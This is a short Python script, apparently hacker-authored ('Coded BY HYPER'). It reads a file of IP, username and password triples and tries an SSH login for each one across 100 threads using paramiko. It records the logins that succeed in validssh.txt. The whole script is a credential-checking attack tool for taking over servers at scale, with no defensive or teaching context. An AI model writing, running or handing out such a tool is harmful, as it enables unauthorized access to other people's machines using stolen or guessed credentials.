import paramiko
from colorama import *
from multiprocessing.dummy import Pool as TreadPool
#Coded BY HYPER

port = 22

def sshcheck(ip):
    try:
        ipadd , username , password = ip.split("|")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ipadd, port=22, username=username, password=password)
        print(Fore.GREEN + "Login Succcessful " + ipadd)
        open("validssh.txt", "a").write(ipadd+"|"+username+"|"+password + "\n" )
        ssh.close()
    except:
        print(Fore.RED + "\n[-] Failed Login " + ipadd)


def loadlist():
    try:
        load = input("Give me list > ")
        try:
            with open(load, 'r') as (get):
                read = get.read().splitlines()
        except IOError:
            pass

        read = list(read)
        try:
            pp = TreadPool(100)
            pr = pp.map(sshcheck, read)
        except:
            pass
    except:
        pass
loadlist()